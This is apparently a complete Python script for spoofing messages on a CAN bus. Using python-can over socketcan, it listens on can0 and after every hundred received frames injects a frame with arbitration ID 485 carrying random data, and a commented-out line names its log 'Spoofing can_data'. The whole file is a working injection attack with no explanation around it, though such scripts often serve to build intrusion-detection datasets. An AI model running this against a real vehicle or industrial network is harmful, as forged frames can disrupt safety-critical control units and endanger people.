import can
import random
import sys
import time 
from datetime import datetime

cnt = 0

bus = can.interface.Bus(bustype = 'socketcan', channel = 'can0', bitrate = 250000)
#sys.stdout = open("Spoofing can_data"+ str(datetime.today())+".txt", 'w')
try:
    while True:
      message = bus.recv()
      cnt += 1
      #print(cnt)
      #print((str(message)+" T"))
      if cnt == 100:
            if message.arbitration_id != 0:
                msg = can.Message(arbitration_id = 485, data = random.sample(range(1,100),8))
                bus.send(msg)
                cnt = 0
                print((str(msg)+" R"))
                
                
           
except can.CanError:
    print("Message NOT sent")

